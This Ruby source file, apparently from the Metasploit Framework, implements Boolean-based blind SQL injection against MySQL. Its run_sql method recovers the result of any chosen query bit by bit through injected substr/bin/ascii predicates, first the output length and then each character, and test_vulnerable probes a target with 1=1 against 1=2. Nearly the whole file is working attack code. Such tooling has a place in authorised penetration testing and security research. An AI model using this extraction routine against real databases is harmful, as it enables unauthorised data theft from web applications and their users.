#
#   Boolean-Based Blind SQL injection support for MySQL
#
class Msf::Exploit::SQLi::MySQLi::BooleanBasedBlind < Msf::Exploit::SQLi::MySQLi
  #
  #  
  #
    #
    #   Gets the output of the given SQL query, in a boolean-based blind manner.
    #   The block given to initialize must return true if querying its parameter
    #   gave a result, false otherwise.
    #   @param query [String] The SQL query to execute
    #   @return [String] The query results
    #
  def run_sql(query)
    # TODO: be more verbose if verbose is true
    # first, get the length of the output
    reversed_output_length = 0
    i = 0
    loop do
      output_bit = blind_request("1=substr(bin(length((#{query}))), #{i + 1}, 1)")
      reversed_output_length |= (1 << i) if output_bit
      i += 1
      stop = blind_request("''=substr(bin(length((#{query}))), #{i + 1}, 1)")
      break if stop # substr returned an empty string, end of input
    end
    # reverse the bits in reversed_output_length
    output_length = 0
    i.times do
      output_length <<= 1
      output_length |= reversed_output_length & 1
      reversed_output_length >>= 1
    end

    # now, get the output, of the given length

    output = output_length.times.map do |j|
      current_character = 0
      8.times do |k|
        # the query below: the inner substr returns a character from the result, the outer returns a bit of it
        output_bit = blind_request("1=substr(lpad(bin(ascii(substr((#{query}), #{j + 1}, 1))), 8,'0'),#{k + 1},1)")
        current_character |= (1 << (7 - k)) if output_bit
      end
      current_character.chr
    end.join
    output
  end

  def test_vulnerable
    out_true = blind_request("1=1")
    out_false = blind_request("1=2")
    out_true && !out_false
  end

  private

  def check_opts(opts)
    super
  end
  
  def blind_request(query)
    @query_proc.call(@prefix + query + @suffix)
  end
end
